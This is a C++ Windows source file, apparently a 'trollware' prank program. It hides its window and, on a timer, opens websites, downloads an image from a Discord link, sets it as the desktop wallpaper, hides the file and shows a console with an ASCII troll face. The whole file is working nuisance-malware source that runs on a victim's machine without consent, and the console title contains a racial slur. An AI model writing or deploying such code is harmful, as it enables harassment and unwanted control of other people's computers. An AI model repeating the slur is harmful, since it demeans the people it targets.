// trollware.cpp : This file contains the 'main' function. Program execution begins and ends there.
//
#include <Windows.h>
#include <iostream>
#include <chrono>

#include <cwchar>

#include <shlobj.h>
#include <shellapi.h>
#include <urlmon.h>
#pragma comment(lib, "Urlmon.lib")

#ifdef _DEBUG
constexpr int trollInterval = 10;
float elapsedTime = 1.0f; // wait for first troll
#elif NDEBUG
constexpr int trollInterval = 60;
float elapsedTime = 0.0f;
#endif

CONSOLE_FONT_INFOEX cfi;
CONSOLE_SCREEN_BUFFER_INFOEX consolesize;


void trollConsole();
LRESULT CALLBACK WindowProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam);


BOOL WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
    HWND hwnd;
    WNDCLASSEX wc;
    ZeroMemory(&wc, sizeof(WNDCLASSEX));

    wc.cbSize = sizeof(WNDCLASSEX);
    wc.style = CS_HREDRAW | CS_VREDRAW;
    wc.lpfnWndProc = WindowProc;
    wc.hInstance = hInstance;
    wc.hCursor = LoadCursor(NULL, IDC_NO);
    wc.lpszClassName = L"TrollwareWC";

    // register the window class
    RegisterClassEx(&wc);

    const RECT wr = { 0, 0, 0, 0 };

    // create the window and use the result as the handle
    hwnd = CreateWindowExW(NULL,
        wc.lpszClassName,    // name of the window class
        L"Trollware",   // title of the window
        WS_OVERLAPPEDWINDOW,    // window style
        300,    // x-position of the window
        300,    // y-position of the window
        wr.right - wr.left,    // width of the window
        wr.bottom - wr.top,    // height of the window
        NULL,    // we have no parent window, NULL
        NULL,    // we aren't using menus, NULL
        hInstance,    // application handle
        NULL);    // used with multiple windows, NULL

    ShowWindow(hwnd, SW_HIDE);
#ifdef _DEBUG
    ShowWindow(hwnd, SW_SHOW);
#endif
    AllocConsole();
    SetConsoleTitleW(L"Get trolled negga");
    FILE* f;
    freopen_s(&f, "CONOUT$", "w", stdout);


    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);

    cfi.cbSize = sizeof(CONSOLE_FONT_INFOEX);
    GetCurrentConsoleFontEx(hConsole, FALSE, &cfi);
    cfi.dwFontSize.X = 0;                   // Width of each character in the font
    cfi.dwFontSize.Y = 10;                  // Height
    cfi.FontWeight = FW_SEMIBOLD;
    SetCurrentConsoleFontEx(hConsole, FALSE, &cfi);

    consolesize.cbSize = sizeof(consolesize);
    GetConsoleScreenBufferInfoEx(hConsole, &consolesize);
    COORD c;
    c.X = 76;
    c.Y = 29;
    consolesize.dwSize = c;
    consolesize.srWindow.Left = 0;
    consolesize.srWindow.Right = c.X;
    consolesize.srWindow.Top = 0;
    consolesize.srWindow.Bottom = c.Y;
    SetConsoleScreenBufferInfoEx(hConsole, &consolesize);
    
    trollConsole();

    const auto initDuration = std::chrono::high_resolution_clock::now().time_since_epoch();

    static char deskPath[MAX_PATH + 1];
    const bool hasDeskPath = SHGetSpecialFolderPathA(HWND_DESKTOP, deskPath, CSIDL_DESKTOP, FALSE);

    MSG msg;
    while (true)
    {
        auto now = std::chrono::high_resolution_clock::now().time_since_epoch();
        int troll = (int)((float)std::chrono::duration_cast<std::chrono::microseconds>((now - initDuration)).count() / 1000 / 1000);

        static int trollCounter = 0;
        constexpr const char* trollWebUrlList[] = {
            "https://google.dk",
            "https://youtube.dk",
            "https://bing.dk",
            "https://yahoo.dk"
        };

        constexpr const char* trollImageUrlList[] = {
            "https://cdn.discordapp.com/attachments/1117699911786438668/1161932979573116958/image.png",
            "https://cdn.discordapp.com/attachments/456024279822106644/1161928995705729086/2Q.png",
        };

        constexpr int trollWebUrlCount = sizeof(trollWebUrlList) / sizeof(char*);
        constexpr int trollImageUrlCount = sizeof(trollImageUrlList) / sizeof(char*);
        
        static bool didTroll = false;
        if (troll%trollInterval == 0) {
            if (didTroll == false) {
                didTroll = true;

                const std::string backgroundPathA = std::string(deskPath) + "\\troll.png";

#ifdef NDEBUG
                ShellExecuteA(0, 0, trollWebUrlList[trollCounter % trollWebUrlCount], 0, 0, SW_SHOW);
#endif
                remove(backgroundPathA.c_str());
                HRESULT hr;
                hr = URLDownloadToFileA(0, trollImageUrlList[trollCounter % trollImageUrlCount], backgroundPathA.c_str(), BINDF_GETNEWESTVERSION, 0);
                if (hr == S_OK) {
                   SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, (PVOID)backgroundPathA.c_str(), SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
                }

                DWORD attributes = GetFileAttributesA(backgroundPathA.c_str());
                if (attributes != INVALID_FILE_ATTRIBUTES) {
                    attributes |= FILE_ATTRIBUTE_HIDDEN;
                    SetFileAttributesA(backgroundPathA.c_str(), attributes);
                }
                trollConsole();
                trollCounter += 1;
            }
        }
        else {
            didTroll = false;
        }

#ifdef _DEBUG
        static bool state = false;
        if (GetAsyncKeyState(VK_UP) & 0x0001) {
            ShowWindow(hwnd, state == true ? SW_HIDE : SW_SHOW);
            state = !state;
        }
#endif

        if (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);

            if (msg.message == WM_QUIT)
                break;
        }
    }
}

// this is the main message handler for the program
LRESULT CALLBACK WindowProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
    switch (message) {
        // this message is read when the window is closed
    case WM_DESTROY:
        // close the application entirely
        PostQuitMessage(0);
        return 0;
        break;
    }
    // Handle any messages the switch statement didn't
    return DefWindowProc(hWnd, message, wParam, lParam);
}



void trollConsole() {
#ifdef _DEBUG
    static bool consoleOpen = false;
    if (!consoleOpen) {
#endif
        AllocConsole();
        SetConsoleTitleW(L"Get trolled negga");
        FILE* f = 0;
        if (!f) {
            freopen_s(&f, "CONOUT$", "w", stdout);
        }
        
        HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
        SetCurrentConsoleFontEx(hConsole, FALSE, &cfi);
        SetConsoleScreenBufferInfoEx(hConsole, &consolesize);

#ifdef _DEBUG
        consoleOpen = true;
    }
#endif

    printf("\n\n@@@@@@@@@@@@@@@@@@@W@@@@@WWWBBBHHHHHHHHHBWWW@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n");
    printf("@@@@@@@@@@@@@@@D!`__ssaaaaaaaaaass_ass_s____.  -~\"\"??9VW@@@@@@@@@@@@@@@@@@@\n");
    printf("@@@@@@@@@@@@@P'_wm@@@WWBWV?GwwwmmW@mwwwwwgmZUVVHA@waaaac,\"?9$@@@@@@@@@@@@@@\n");
    printf("@@@@@@@@@@@W! a@W@@@@W?@w#TTSgwawwggywawwpY?T?TYTYTXmwwgZ$ma/-?4@@@@@@@@@@@\n");
    printf("@@@@@@@@@@W' j@@@@WT@wDYauT9mmwwawww?WWWW@@@@@@TT?TVTT9H@@@@@@w,-4@@@@@@@@@\n");
    printf("@@@@@@@@@@[ j@@@@@yWVw2$wWW@@@WW@WWWW7W@@@@@@@@PWW@@@W@@w7W@@@WWc)WW@@@@@@@\n");
    printf("@@@@@@@@@f j@@@@@WWmWmm@WU???????9WW@mW@@@@@@@WjW@@@@@@@W@m@@@@WL 4@@@@@@@@\n");
    printf("@@@@@@@P'.y@@@@@@@@@@@P\"       <wa,.!4W@@@@@@@WdWP??!\"??4WW@@@W@@c ?@W@@@@@\n");
    printf("@@@@@P'_a.<aam@@@W!<yF \"!` ..  \"??$@a \"W@@@WTVP'    \"??' =@@mWWV?46/ ?@@@@@\n");
    printf("@@@P'sdyW@P?!`.-\"?46m@@@@@@T!m@@gaa. <wW@@W@aa _aawmWW@@@@@@@@@WP4a7g -WW@@\n");
    printf("@@[ j@m@P'ad@@P4ga, -????\" <j@@@@@W@@@@@@@@@WW;)W@WWWW9@@P?\"`  -?@z@7L ]@@@\n");
    printf("@W j@k@@ jW@@D'-?$@@@@@@@@@@@@@@@@@WW@W@@@W@@@c \"4@@@@a   .@P4@@@@fWkl j@@@\n");
    printf("@E ]@k@k $D?`  waa \"?9WW@@@P??T?47`_aam@@@@@@WW@w,-?@WW@@@@@`\"@@@@D\@f(.@W@@\n");
    printf("@@,-@m4@/-@m@6 \"WW@ma/  \"??@@@@@@L 4W\"- -?$@@@@WP`s,awT$@@@@  \"@W@?$:.y@@@@\n");
    printf("@@m/-4wT@g@W@@,  ?4WWk 4waac -???$wa@@@@@@@@F??'<mWWWWW@W?^  ` ]6@@' y@@@@@\n");
    printf("@@@@w,-?@mW@@@@w  a,    ?@WW@@@w _.  \"????9VWaam@WV???\"  a j/  ]@@f j@@@@@@\n");
    printf("@@@@@@w,\"4@@@@@@m,-$@a     ???4F j@@@@@wc <aaas _aaaaa 4@W ]E  )W@`=@@@@@@@\n");
    printf("@@@@@@W@/ $@@@@@@@a ?H ]Wwa,     ???9WWWh d@WWW,=@WWU?  ?!     )W@ ]@@@@@@@\n");
    printf("@@@@@@@@@c-@W@@@@@W6,  @W@W@@@k <c                             jW@ ]@@@@@@@\n");
    printf("@@@@@@@@@@,\"$W@@W@@@@g,.\"?@@@@'.m@@@maa,.,                . .; @W@.]@@@@@@@\n");
    printf("@@@@@@@@@W@a ?$W@@W@@@@@a,.\"?( m@@@@@@W[:@@@@m[ ammF jy! j( } j@@@(:@@@@@@@\n");
    printf("@@@@@@@@@@WWma \"9gw?9gdB?@@wa, -??T$W@@;:@@@W@ ]WWD _@f +?! _j@@@Wf @@@@@@@\n");
    printf("@@@@@@@@@@@@@@@ws \"T@au?9maZ?W@maas,,    --~-- ---  . _ssawm@@@@@@k 3@@@@W@\n");
    printf("@@@@@@@@@@@@@@@@W@ga,-?9mwad?1wdT9W@@@@@WVVTTYY?YTVW@@@@WWD5m@@P@@@ ]@@@@@@\n");
    printf("@@@@@@@W@@@@@@@@@@@W@@wa,-??$@wadV}<wBHHVHWWBHHUWWBVTTTV5awB@@D6@@@ ]@@@@@@\n");
    printf("@@@@@@@@@@@@@@@@@@@@@@WW@@ga,-\"9$W@@mmwwmBUUHTTVWBW@@@@WVT?96a@W@@@ ]@@@@@@\n");
    printf("@@@@@@@@@@W@@@@W@@@@@@@@@@@W@@ma,-?9$@@WW@@@@@@@Wm@mmmmm@W@@@@W@@W(.y@@@@@W\n");
    printf("@@@@@@@@@@@@@W@@@@@@W@@@@@@@@@@@@@ga%,.  -??9$@@@@@@@@@@@@W@@W@@V? sW@@@@@@@\n");
    printf("@@@@@@@@@W@@@@@@@@@@@@@@W@@@@@@@@@@@W@@@@mywaa,;~^\"!???????!^`_sa@WW@@@@@@@");

    
#ifdef NDEBUG
    FreeConsole();
#endif
}